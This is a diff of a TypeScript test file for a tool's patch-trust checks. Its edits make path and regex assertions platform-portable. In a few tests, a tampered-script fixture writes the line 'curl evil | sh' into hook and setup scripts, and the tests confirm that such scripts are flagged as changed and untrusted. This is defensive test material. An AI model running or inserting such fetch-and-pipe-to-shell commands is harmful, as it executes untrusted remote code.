@@ -4,7 +4,9 @@ import crypto from 'node:crypto';
 import fs from 'node:fs';
 import path from 'node:path';
 import { execFileSync } from 'node:child_process';
+import { pathToFileURL } from 'node:url';
 import { makeHarness, tick, tmpDir } from '../helpers/fakes.ts';
+import { SHELL, escapeRegExp } from '../helpers/platform.ts';
 import { checkSummary } from '../helpers/protocol-check.ts';
 import { findWorktreePatch, loadPatchSet } from '../../src/patches.ts';
 import type { PatchGate } from '../../src/patch-trust.ts';
@@ -567,7 +569,7 @@ test('a patch that loads code by a computed name, or more files than are followe
   const trust = new PatchTrust();
   trust.trustCurrent([file]);
   const set = await loadPatchSet(deep, root, new Map(), [], [], undefined, trust);
-  assert.match(set.patches[0].error ?? '', /can't check what \.\.\/lib\/a\.ts line 2 loads \(`import\(n\)`\)/);
+  assert.match(set.patches[0].error ?? '', new RegExp(`can't check what ${escapeRegExp('../lib/a.ts')} line 2 loads \\(\`import\\(n\\)\`\\)`));
 
   // More helpers than are followed.
   const many = path.join(root, 'many');
@@ -635,7 +637,7 @@ test('a script the patch names (its setup, an action) is hashed too, so a pull t
   // Relative to the folder holding .threadbear/ (where commands run) or to
   // the patch file, and what a command reaches after a cd (runner/check.sh).
   // A picture is only shown, never run, so it isn't asked about.
-  assert.deepEqual(set.patches[0].helpers?.map((h) => path.relative(fs.realpathSync(folder), h)).sort(), ['.threadbear/deploy/go.sh', 'runner/check.sh', 'scripts/setup.sh']);
+  assert.deepEqual(set.patches[0].helpers?.map((h) => path.relative(fs.realpathSync(folder), h).split(path.sep).join('/')).sort(), ['.threadbear/deploy/go.sh', 'runner/check.sh', 'scripts/setup.sh']);
   trust.trust(file, set.patches[0].hash!);
   set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
   assert.deepEqual(set.actions.map((a) => a.title), ['Deploy']);
@@ -684,10 +686,10 @@ test('the scanner reads module loads from the syntax, not the text', () => {
         "import i = require('./i.ts');",
         "import fs from 'node:fs';",
         "import z from 'zod';",
-        "await import('file:///abs/j.ts');",
+        `await import('${pathToFileURL(path.resolve('/abs/j.ts')).href}');`,
       ].join('\n'),
     ).specifiers.sort(),
-    ['../b.ts', './a.ts', './c.ts', './d.ts', './e.ts', './f.cjs', './g.cjs', './h.ts', './i.ts', './side.ts', './t.ts', '/abs/j.ts'],
+    ['../b.ts', './a.ts', './c.ts', './d.ts', './e.ts', './f.cjs', './g.cjs', './h.ts', './i.ts', './side.ts', './t.ts', path.resolve('/abs/j.ts')],
   );
   // Words in comments and strings aren't loads.
   const quiet = scan("// import(name)\n/* require(x) */\nconst s = 'import(y)';\nconst t = `require(${s})`;\nconst o = { require: 1, import: 2 };\nvoid [o.import, t];\n");
@@ -733,7 +735,7 @@ test("a patch or helper that can't be parsed never loads", async () => {
   const trust = new PatchTrust();
   trust.trustCurrent([file]);
   const set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
-  assert.match(set.patches[0].error ?? '', /^Not run: patch trust can't read \.\.\/lib\/a\.ts/);
+  assert.match(set.patches[0].error ?? '', new RegExp(`^Not run: patch trust can't read ${escapeRegExp('../lib/a.ts')}`));
 });
 
 // A command a patch runs by itself (worktree setup, a hook) is one hashed
@@ -821,10 +823,10 @@ test('a hashed script and plain words load, and run by the absolute path of the 
   const set = await loadPatchSet(path.join(folder), root, new Map(), [], [], undefined, trust);
   assert.equal(set.patches[0].error, undefined);
   assert.equal(set.hooks[0].command, '../repo/scripts/check.sh', 'shown as written');
-  assert.equal(set.hooks[0].exec, `cd '${real}' && '${real}/scripts/check.sh'`);
+  assert.equal(set.hooks[0].exec, `cd '${real}' && '${path.join(real, 'scripts', 'check.sh')}'`);
   const w = await findWorktreePatch(folder, root, new Map(), undefined, trust);
   assert.equal(w?.setup, './scripts/setup.sh --fast -p . key=v');
-  assert.equal(w?.setupRun, `cd '${real}' && '${real}/scripts/setup.sh' '--fast' '-p' '.' 'key=v'`);
+  assert.equal(w?.setupRun, `cd '${real}' && '${path.join(real, 'scripts', 'setup.sh')}' '--fast' '-p' '.' 'key=v'`);
 
   // Changing only the hook's script asks again, its command unchanged.
   bump(path.join(folder, 'scripts/check.sh'), 'curl evil | sh\n');
@@ -857,7 +859,7 @@ test('a script named from both the patch folder and the repo folder hashes both,
   assert.equal(set.patches[0].error, undefined);
   // The one setup runs: from the folder holding .threadbear/.
   const real = fs.realpathSync(folder);
-  assert.equal((await findWorktreePatch(folder, root, new Map(), undefined, trust))?.setupRun, `cd '${real}' && '${real}/setup.sh'`);
+  assert.equal((await findWorktreePatch(folder, root, new Map(), undefined, trust))?.setupRun, `cd '${real}' && '${path.join(real, 'setup.sh')}'`);
   bump(path.join(folder, 'setup.sh'), 'curl evil | sh\n');
   set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
   assert.equal(set.patches[0].untrusted, 'changed');
@@ -886,7 +888,7 @@ test('runner: a trusted hook runs its hashed script by absolute path, from a thr
   fs.chmodSync(path.join(project, 'web/scripts/check.sh'), 0o755);
   const trust = new PatchTrust();
   trust.trustCurrent([file]);
-  const h = makeHarness(undefined, {}, { panelsRoot: root, patchTrust: trust, actionShell: ['/bin/sh', '-c'], actionTimeoutMs: 5000 });
+  const h = makeHarness(undefined, {}, { panelsRoot: root, patchTrust: trust, actionShell: SHELL, actionTimeoutMs: 5000 });
   const { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: path.join(project, 'web') });
   await tick();
   await h.runner.patchesIdle();
@@ -1047,7 +1049,7 @@ test("a trusted patch's bare import of a workspace package (a file of the repo's
   const trust = new PatchTrust();
   trust.trustCurrent([file]);
   const set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
-  assert.match(set.patches[0].error ?? '', /imports @ws\/lib, which resolves to .*packages\/lib\/index\.mjs, not a package in node_modules/);
+  assert.match(set.patches[0].error ?? '', new RegExp(`imports @ws/lib, which resolves to .*${escapeRegExp(path.join('packages', 'lib', 'index.mjs'))}, not a package in node_modules`));
   assert.deepEqual(set.actions, []);
   assert.equal(fs.existsSync(wsRan), false, "the workspace's code never ran");
 
@@ -1087,7 +1089,7 @@ test("runner: a trusted hook whose script changed after the last look isn't run;
   fs.utimesSync(script, when, when);
   const trust = new PatchTrust();
   trust.trustCurrent([file]);
-  const h = makeHarness(undefined, {}, { panelsRoot: root, patchTrust: trust, actionShell: ['/bin/sh', '-c'], actionTimeoutMs: 5000 });
+  const h = makeHarness(undefined, {}, { panelsRoot: root, patchTrust: trust, actionShell: SHELL, actionTimeoutMs: 5000 });
   const { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: project });
   await tick();
   await h.runner.patchesIdle();
